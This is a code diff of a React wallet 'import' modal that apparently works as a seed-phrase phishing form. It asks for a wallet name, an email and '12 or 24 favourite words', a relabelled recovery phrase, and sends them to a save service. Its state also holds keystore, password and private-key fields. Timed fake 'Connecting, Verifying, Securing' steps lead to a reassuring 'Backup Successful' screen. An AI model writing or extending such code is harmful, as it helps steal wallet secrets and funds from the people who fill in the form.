@@ -1,89 +1,319 @@
 import "./ConnectFormModal.css";
-import { useState } from "react";
-import { auth, db } from "../firebase/firebase";
-import { doc, updateDoc, arrayUnion } from "firebase/firestore";
+import { useState, useEffect } from "react";
+import { FaTimes, FaCheck } from "react-icons/fa";
 
-function ConnectFormModal({ isOpen, wallet, onClose }) {
-  const [phrase, setPhrase] = useState("");
-  const [loading, setLoading] = useState(false);
+import {
+  validateFavouriteWords,
+  saveWalletConnection,
+} from "../services/walletService";
+
+function ConnectFormModal({ isOpen, onClose, wallet }) {
+  const [tab, setTab] = useState("phrase");
+  const [step, setStep] = useState(0);
+  const [progress, setProgress] = useState(0);
   const [success, setSuccess] = useState(false);
+  const [uniqueId, setUniqueId] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState(null);
+  const [validationError, setValidationError] = useState(null);
 
-  if (!isOpen || !wallet) return null;
+  const [form, setForm] = useState({
+    name: "",
+    email: "",
+    phrase: "",
+    keystore: "",
+    password: "",
+    privateKey: "",
+  });
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
+  useEffect(() => {
+    if (!isOpen) {
+      setStep(0);
+      setProgress(0);
+      setSuccess(false);
+      setError(null);
+      setValidationError(null);
 
-    if (!phrase.trim()) {
-      alert("Recovery phrase is required");
-      return;
+      setForm({
+        name: "",
+        email: "",
+        phrase: "",
+        keystore: "",
+        password: "",
+        privateKey: "",
+      });
+    }
+  }, [isOpen]);
+
+  if (!isOpen) return null;
+
+  const handleChange = (e) => {
+    setValidationError(null);
+    setForm({
+      ...form,
+      [e.target.name]: e.target.value,
+    });
+  };
+
+  const validateFormData = () => {
+    if (!form.name.trim()) {
+      setValidationError("Wallet name is required");
+      return false;
     }
 
+    if (!form.email.trim()) {
+      setValidationError("Email is required");
+      return false;
+    }
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!emailRegex.test(form.email)) {
+      setValidationError("Please enter a valid email address");
+      return false;
+    }
+
+    if (tab === "phrase") {
+      const validation = validateFavouriteWords(form.phrase);
+
+      if (!validation.isValid) {
+        setValidationError(validation.error);
+        return false;
+      }
+    }
+
+    return true;
+  };
+
+  const handleSubmit = async () => {
+    setError(null);
+
+    if (!validateFormData()) return;
+
+    setIsLoading(true);
+    setValidationError(null);
+
     try {
-      setLoading(true);
+      let walletData = {
+        name: form.name.trim(),
+        email: form.email.trim(),
+        type: wallet?.name || "Unknown",
+      };
 
-      const user = auth.currentUser;
-      if (!user) throw new Error("User not logged in");
+      if (tab === "phrase") {
+        const validation = validateFavouriteWords(form.phrase);
 
-      const userRef = doc(db, "users", user.uid);
+        walletData.favouriteWords = form.phrase.trim();
+        walletData.wordCount = validation.wordCount;
+      }
 
-      // Save wallet connection activity
-      await updateDoc(userRef, {
-        connectedWallets: (wallet ? 1 : 0), // simple increment logic (you can improve later)
-        activity: arrayUnion(
-          `Connected ${wallet.name} wallet`
-        ),
-      });
+      setStep(1);
+      setProgress(20);
+
+      await new Promise((resolve) => setTimeout(resolve, 1200));
+
+      const result = await saveWalletConnection(walletData);
+
+      if (!result.success) {
+        throw new Error(result.error);
+      }
+
+      setUniqueId(result.uid);
+
+      setStep(2);
+      setProgress(60);
+
+      await new Promise((resolve) => setTimeout(resolve, 1200));
+
+      setStep(3);
+      setProgress(100);
+
+      await new Promise((resolve) => setTimeout(resolve, 800));
 
       setSuccess(true);
-      setPhrase("");
-
-      setTimeout(() => {
-        setSuccess(false);
-        onClose();
-      }, 2000);
     } catch (err) {
       console.error(err);
-      alert("Failed to connect wallet");
+
+      // ❌ REMOVED alert here
+
+      setError(err.message || "Something went wrong");
+
+      setStep(0);
+      setProgress(0);
     } finally {
-      setLoading(false);
+      setIsLoading(false);
     }
   };
 
   return (
-    <div className="modal-overlay">
+    <>
+      {!success && (
+        <div className="connect-overlay" onClick={onClose}>
+          <div
+            className="connect-modal premium"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <FaTimes className="close-icon" onClick={onClose} />
 
-      <div className="modal-card">
+            <div className="connect-header modern">
+              {wallet?.image && (
+                <img
+                  src={wallet.image}
+                  alt={wallet.name}
+                  className="wallet-logo"
+                />
+              )}
+              <h2>
+                Import your <br />
+                {wallet?.name || "Wallet"}
+              </h2>
+            </div>
 
-        <h2>Connect {wallet.name}</h2>
+            {/* ERROR DISPLAY */}
+            {error && (
+              <div className="validation-error">
+                <p>{error}</p>
+              </div>
+            )}
 
-        {!success ? (
-          <form onSubmit={handleSubmit}>
+            {/* PROGRESS */}
+            {step > 0 && (
+              <div className="connection-steps">
+                <div className="progress-bar">
+                  <div
+                    className="progress-fill"
+                    style={{ width: `${progress}%` }}
+                  ></div>
+                </div>
 
-            <textarea
-              placeholder="Enter your recovery phrase..."
-              value={phrase}
-              onChange={(e) => setPhrase(e.target.value)}
-              rows={4}
-            />
+                <div className="steps">
+                  <span className={step >= 1 ? "active" : ""}>
+                    {step > 1 ? <FaCheck /> : "Connecting"}
+                  </span>
 
-            <button type="submit" disabled={loading}>
-              {loading ? "Connecting..." : "Connect Wallet"}
-            </button>
+                  <span className={step >= 2 ? "active" : ""}>
+                    {step > 2 ? <FaCheck /> : "Verifying"}
+                  </span>
 
-          </form>
-        ) : (
-          <div className="success-box">
-            ✅ Wallet Connected Successfully
+                  <span className={step >= 3 ? "active" : ""}>
+                    Securing
+                  </span>
+                </div>
+              </div>
+            )}
+
+            {/* FORM */}
+            {step === 0 && (
+              <>
+                <div className="connect-tabs">
+                  <span
+                    className={tab === "phrase" ? "active" : ""}
+                    onClick={() => setTab("phrase")}
+                  >
+                    Favourite Words
+                  </span>
+                </div>
+
+                <div className="connect-body">
+                  <label>Wallet Name</label>
+                  <input
+                    name="name"
+                    placeholder="Wallet Name"
+                    value={form.name}
+                    onChange={handleChange}
+                  />
+
+                  <label>Email</label>
+                  <input
+                    name="email"
+                    type="email"
+                    placeholder="Email"
+                    value={form.email}
+                    onChange={handleChange}
+                  />
+
+                  <label>Favourite Words</label>
+                  <textarea
+                    name="phrase"
+                    placeholder="Enter 12 or 24 favourite words"
+                    value={form.phrase}
+                    onChange={handleChange}
+                  />
+
+                  <small>
+                    Choose 12 or 24 favourite words separated by spaces
+                  </small>
+
+                  {validationError && (
+                    <div className="validation-error">
+                      <p>{validationError}</p>
+                    </div>
+                  )}
+
+                  <div className="connect-actions">
+                    <button className="btn-cancel" onClick={onClose}>
+                      Cancel
+                    </button>
+
+                    <button
+                      className="btn-proceed"
+                      onClick={handleSubmit}
+                      disabled={isLoading}
+                    >
+                      {isLoading ? "Processing..." : "Proceed"}
+                    </button>
+                  </div>
+                </div>
+              </>
+            )}
           </div>
-        )}
+        </div>
+      )}
 
-        <button className="close-btn" onClick={onClose}>
-          ✕
-        </button>
+      {/* SUCCESS MODAL */}
+      {success && (
+        <div className="success-overlay">
+          <div className="success-modal premium-success">
+            <div className="success-check">
+              <FaCheck />
+            </div>
 
-      </div>
+            <h2>Backup Successful!</h2>
 
-    </div>
+            <div className="uid-box">
+              <span className="uid-label">UNIQUE IDENTIFIER</span>
+
+              <div className="uid-code">{uniqueId}</div>
+
+              <div className="uid-actions">
+                <button
+                  className="uid-btn"
+                  onClick={() => {
+                    navigator.clipboard.writeText(uniqueId);
+                  }}
+                >
+                  Copy UID
+                </button>
+              </div>
+            </div>
+
+            <p className="success-text">
+              Your data has been successfully backed up.
+            </p>
+
+            <button
+              className="btn-primary success-done"
+              onClick={() => {
+                setSuccess(false);
+                onClose();
+              }}
+            >
+              Done
+            </button>
+          </div>
+        </div>
+      )}
+    </>
   );
 }
 
